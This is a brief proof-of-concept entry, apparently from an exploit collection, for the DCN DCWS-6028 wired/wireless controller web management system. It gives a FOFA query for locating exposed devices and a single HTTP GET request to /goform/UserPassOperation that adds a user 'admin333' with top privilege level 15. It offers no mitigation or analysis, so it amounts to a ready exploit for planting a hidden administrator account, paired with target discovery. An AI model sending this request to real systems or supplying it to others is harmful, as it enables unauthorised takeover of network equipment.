## DCN有线无线智能一体化控制器WEB管理系统



## fofa

```
app="DCN-DCWS-6028"
```

## poc

```
GET /goform/UserPassOperation?user=admin333&password=123456&userpriority=15&operation=1 HTTP/1.1
Host: your-ip
Content-Length: 2
```



![image-20240525204429235](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405252044322.png)